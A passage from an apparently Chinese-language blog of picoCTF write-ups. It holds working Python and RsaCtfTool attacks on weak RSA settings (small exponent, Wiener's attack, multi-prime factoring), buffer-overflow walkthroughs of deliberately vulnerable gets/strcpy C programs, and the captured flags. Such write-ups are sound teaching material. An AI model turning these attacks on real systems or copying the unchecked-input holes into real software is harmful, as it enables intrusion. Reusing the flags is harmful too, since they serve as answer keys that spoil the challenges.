1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106</span><br></pre></td></tr></table></figure><p>不難發現，這題的公鑰指數 e 超小，只有 3。所以我們使用小公鑰指數攻擊（Coppersmith’s attack, Low public exponent attack）。由於題目有說$m^e$略大於$n$，故其解題原理如下（$c$為密文，$m$為明文，$e$是公鑰指數，$n$是公鑰模數）：</p><p>$c&#x3D;m^e\mod n$</p><p>$m^e&#x3D;k\times n+c$</p><p>$\text{Bruteforce k and find the eth root of }k\times n+c$</p><p>為了計算明文，我寫了一個 Python 腳本，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目所給的n, e, c</span></span><br><span class="line">n = <span class="number">1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力破解 k * n + c 的 e 次方根</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m, is_root = gmpy2.iroot(k * n + c, e)</span><br><span class="line">    <span class="keyword">if</span> is_root:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 數字轉字串</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><p>執行後就可以找到 flag 啦～</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702161343132.png" alt="Flag"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;e_sh0u1d_b3_lArg3r_7adb35b1&#125;</span><br></pre></td></tr></table></figure><h2 id="miniRSA"><a href="#miniRSA" class="headerlink" title="miniRSA"></a>miniRSA</h2><p>這題的原理和上面那題一模一樣，都是e太小所以用小公鑰指數攻擊。想知道更詳細原理看<a href="http://localhost:4000/CTF/All-in-One%20PicoCTF-Writeups/#Mini-RSA">上面那題</a>，這邊直接上Exploit。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目所給的n, e, c</span></span><br><span class="line">n = <span class="number">29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">2205316413931134031074603746928247799030155221252519872650080519263755075355825243327515211479747536697517688468095325517209911688684309894900992899707504087647575997847717180766377832435022794675332132906451858990782325436498952049751141</span></span><br><span class="line"><span class="comment"># 暴力破解 k * n + c 的 e 次方根</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m, is_root = gmpy2.iroot(k * n + c, e)</span><br><span class="line">    <span class="keyword">if</span> is_root:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 數字轉字串</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;n33d_a_lArg3r_e_d0cd6eae&#125;</span><br></pre></td></tr></table></figure><h2 id="b00tl3gRSA2"><a href="#b00tl3gRSA2" class="headerlink" title="b00tl3gRSA2"></a>b00tl3gRSA2</h2><p>這題給了一個Netcat連接方式<code>nc jupiter.challenges.picoctf.org 57464</code>。先連進去主機看看吧。連進去後可以得到公鑰（e, n）跟密文C。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600</span><br><span class="line">n: 68119657260892882095325897664190568273401102037961904922092525598421583896728037063388427153386051029888075348478917163527609699475528597669779479757588723783858410926089233944915463760773669961431608182207070211704104302242228666666950454789023679482670607533342993172566630254264627616929496230133089420521</span><br><span class="line">e: 37080866881034431981182406871995949206609767233841813908107646836499839869322256469420054910921271502986970536597423895034064361029486896285600240175045808110268909882526287214985406985265436522819284777174250321264328876332147142628536767687999620602780344780826878645902905435208326564999474536627301460973</span><br></pre></td></tr></table></figure><p>在題目的描述中他說：</p><blockquote><p>In RSA d is a lot bigger than e, why don’t we use d to encrypt instead of e?</p></blockquote><p>意思是在這題裡面他把 $d$ 和 $e$ 互換了，用 $d$ 來加密 $e$。下面這篇文章有詳細說了為甚麼不應該使用這種做法。</p><ul><li><a href="https://crypto.stackexchange.com/questions/54557/rsa-does-it-matter-if-you-use-e-or-d-to-encrypt">RSA: Does it matter if you use e or d to encrypt?</a></li></ul><p>簡而言之，當私鑰指數（$d$）比較小的時候，可以使用<a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Wiener’s attack</a>。這邊可以使用一個開源工具來幫助我們快速執行攻擊。</p><ul><li><a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a></li></ul><p>使用方式請查看官方文檔。總之Exploit如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RsaCtfTool.py -e 37080866881034431981182406871995949206609767233841813908107646836499839869322256469420054910921271502986970536597423895034064361029486896285600240175045808110268909882526287214985406985265436522819284777174250321264328876332147142628536767687999620602780344780826878645902905435208326564999474536627301460973 -n 68119657260892882095325897664190568273401102037961904922092525598421583896728037063388427153386051029888075348478917163527609699475528597669779479757588723783858410926089233944915463760773669961431608182207070211704104302242228666666950454789023679482670607533342993172566630254264627616929496230133089420521 --decrypt 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600 --attack wiener</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240707150749451.png" alt="Pwned!"></p><p>總之就是把參數都設定好，就可以成功得到Flag了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;bad_1d3a5_2152720&#125;</span><br></pre></td></tr></table></figure><h2 id="b00tl3gRSA3"><a href="#b00tl3gRSA3" class="headerlink" title="b00tl3gRSA3"></a>b00tl3gRSA3</h2><p>這題和上一題一樣，先用Netcat連線到主機，得到資訊如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 1155413374658603081887942538070618568058048531029758454280998255793925425541835159695263849863790503010031220771999047690488595295467625987010931696477313386062384452816188902386984531395080585643524053777943484599038478398898775019494628236550977835910935567524611329303821647514235510296512723444159728500460371101677191814101634547011569775</span><br><span class="line">n: 3009815969095519381043948515174929441467634594821498333858615496361783804562611599728570248270874306617036697889577813844217713194056663725350522605669349001546826005570895246471872723077264759401472551915667965016802426155245585986786567513487278588996436597960321248870612409759311004096684257474660765774013406405351078796165091907796029759</span><br><span class="line">e: 65537</span><br></pre></td></tr></table></figure><p>題目說了</p><blockquote><p>Why use p and q when I can use more? </p></blockquote><p>意思是，這題的初始質數不只有 $p$ 和 $q$。所以我們只要找到歐拉函數 $\phi(n)$，並且正常走流程就可以了。由於他不只有 $p$ 和 $q$ 兩個質數，分解起來會容易很多。Exploit如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> factorint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_phi</span>(<span class="params">n</span>):</span><br><span class="line">    f = factorint(n) <span class="comment"># 返回一個字典，key為質因數，value為該質因數的冪</span></span><br><span class="line">    phi = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> f.items():</span><br><span class="line">        phi *= <span class="built_in">pow</span>(a, b - <span class="number">1</span>) * (a - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> phi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目給的資訊</span></span><br><span class="line">c = <span class="number">1155413374658603081887942538070618568058048531029758454280998255793925425541835159695263849863790503010031220771999047690488595295467625987010931696477313386062384452816188902386984531395080585643524053777943484599038478398898775019494628236550977835910935567524611329303821647514235510296512723444159728500460371101677191814101634547011569775</span></span><br><span class="line">n = <span class="number">3009815969095519381043948515174929441467634594821498333858615496361783804562611599728570248270874306617036697889577813844217713194056663725350522605669349001546826005570895246471872723077264759401472551915667965016802426155245585986786567513487278588996436597960321248870612409759311004096684257474660765774013406405351078796165091907796029759</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">phi = get_phi(n)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>這邊的<code>get_phi(n)</code>是用到了以下的求歐拉函數的公式：</p><p>$\phi(n) &#x3D; p_1^{k_1 - 1} \times (p_1 - 1) \times p_2^{k_2 - 1} \times (p_2 - 1) \times \cdots \times p_m^{k_m - 1} \times (p_m - 1)$</p><p>這樣求出來 $\phi(n)$ 後就可以用正常計算流程找到明文 $m$ 了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;too_many_fact0rs_8606199&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn-Binary-Exploitation"><a href="#Pwn-Binary-Exploitation" class="headerlink" title="Pwn (Binary Exploitation)"></a>Pwn (Binary Exploitation)</h1><h2 id="Local-Target"><a href="#Local-Target" class="headerlink" title="Local Target"></a>Local Target</h2><p>這題給了一個可執行的檔案和 C 語言的代碼，先來分析一下他的代碼吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *fptr;</span><br><span class="line">  <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> input[<span class="number">16</span>];</span><br><span class="line">  <span class="type">int</span> num = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(input);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;num is %d\n&quot;</span>, num);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (num == <span class="number">65</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You win!\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="comment">// Open file</span></span><br><span class="line">    fptr = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fptr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Cannot open file.\n&quot;</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read contents from file</span></span><br><span class="line">    c = fgetc(fptr);</span><br><span class="line">    <span class="keyword">while</span> (c != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">      c = fgetc(fptr);</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fclose(fptr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>當使用 Netcat 連線到題目的時候，會如同下面一般。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701161031231.png" alt="題目"></p><p><strong>分析代碼</strong></p><ol><li><code>char input[16];</code>宣告了一個長度為 16 的字元陣列，儲存使用者輸入。</li><li><code>gets(input);</code>獲取使用者輸入，由於<code>gets</code>函數不檢查輸入的長度，使用者可以輸入超過 16 個字元。（<a href="https://blog.csdn.net/qq_40907279/article/details/89046366">危险函数 gets()几种完美的替代方法 你可能还不知道的</a>）</li><li><code>int num = 64;</code>宣告並初始化變數<code>num</code>。</li><li>拿到 flag 的條件是要讓 num 的值為 65。</li></ol><p>這邊我們可以用<code>man gets</code>指令進入 gets 的 man 手冊頁，看一下他的 bug 區塊，了解 gets 到底危險在哪裡。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702142351553.png" alt="Bug of gets function"></p><p><strong>BOF 攻擊</strong></p><p>首先，先檢查一下他有沒有任何保護機制。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701171059944.png" alt="Checksec from pwntools"></p><p>他沒有 <a href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/">Canary</a> 也沒有 <a href="https://ithelp.ithome.com.tw/articles/10336777">PIE</a>，就正常做 BOF 就可以了。</p><p>因為<code>input</code>和<code>num</code>都是區域變數，所以會存在 Stack 中。並且因為是先宣告<code>input</code>緊接著宣告<code>num</code>，所以在 Stack 中會像下面這樣：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">High Address</span><br><span class="line">|</span><br><span class="line">|---------------------|</span><br><span class="line">|  Return Address     | &lt;-- top</span><br><span class="line">|---------------------|</span><br><span class="line">|  Frame Pointer      |</span><br><span class="line">|---------------------|</span><br><span class="line">|  int num            | &lt;-- 4 Bytes</span><br><span class="line">|---------------------|</span><br><span class="line">|  char input[16]     | &lt;-- 16 Bytes</span><br><span class="line">|---------------------|</span><br><span class="line">|</span><br><span class="line">Low Address</span><br></pre></td></tr></table></figure><p>最後試出來的 Payload 是 24 個字元加上一個大寫的 A（因為<code>ord(A) == 65</code>），但是在這裡我有點不理解為甚麼前面是 24 個填充，猜測是<code>input[16]</code>跟<code>num</code>中間有 Padding 之類的東西。如果有人知道的話再麻煩跟我解釋一下，感謝了！總之，還是拿到 Flag 啦。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704141242017.png" alt="Flag"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;l0c4l5_1n_5c0p3_fee8ef05&#125;</span><br></pre></td></tr></table></figure><h2 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h2><p>這題也是給了可執行文件和源代碼，先下載下來看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);  <span class="comment">// 這裡會print出flag</span></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">16</span>];  <span class="comment">// 這裡是關鍵。函數的名稱vuln代表著vulnerability</span></span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">           <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(flag, FLAGSIZE_MAX, f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler); <span class="comment">// Set up signal handler 當運行時出現Signal: SIGSEGV (Segmentation fault)時會調用sigsegv_handler函數</span></span><br><span class="line"></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">100</span>];</span><br><span class="line">  gets(buf1);</span><br><span class="line">  vuln(buf1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The program will exit now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析代碼</strong></p><ol><li>Winning condition 是要觸發 Segmentation fault。</li><li><code>vuln</code>函式裡面的<code>buf2</code>宣告為 16 個字元的大小，也就是 16 個 Bytes。</li><li>當<code>gets</code>輸入的內容超過 16 個 Bytes 的時候，觸發錯誤。</li></ol><p>這邊我們可以再來看一下除了<code>gets</code>以外的危險函式，也就是<code>strcpy</code>。（<a href="https://security.stackexchange.com/questions/202358/buffer-overflow-example-strcpy">Buffer Overflow example - strcpy</a>）</p><p>man 手冊裡面也寫了，程式設計師要負起責任，指派一個足夠大的空間給 strcpy 的 dst（Destination）。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702145932067.png" alt="Manual page for strcpy"></p><p><strong>BOF 攻擊</strong></p><p>所以我們知道，在這裡只要輸入很長的字串，就會造成<code>strcpy</code>出錯，並得到 flag，那就來試試看吧！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702150413588.png" alt="Flag"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;ov3rfl0ws_ar3nt_that_bad_9f2364bc&#125;</span><br></pre></td></tr></table></figure><h2 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h2><p>老樣子，一個 ELF 檔案，一個源碼。</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="MSB"><a href="#MSB" class="headerlink" title="MSB"></a>MSB</h2><p>看這個題目名稱，然後又出現在 Forensics，應該是跟隱寫術有關了。如果你還不知道 LSB 和 MSB 都是個啥，可以先去看看 <a href="https://cx330.tw/Notebooks/Cryptography-Notebook-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/">Cryptography Notes 密碼學任督二脈</a>，裡面有解釋了甚麼是 LSB 和 MSB。</p><p>題目的題幹說，This image passes LSB statistical analysis。那相反的，它其實就是在暗示 flag 可能藏在 RGB 像素值的 MSB 中，所以就來提取它每個像素中的的 MSB 吧。這邊用到了 Python 中的 Pillow 這個庫，如果覺得太麻煩，也可以直接用這個現成的工具 <a href="https://github.com/zardus/ctf-tools/tree/master/stegsolve">Stegsolve</a>。</p><p>Exploit 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> 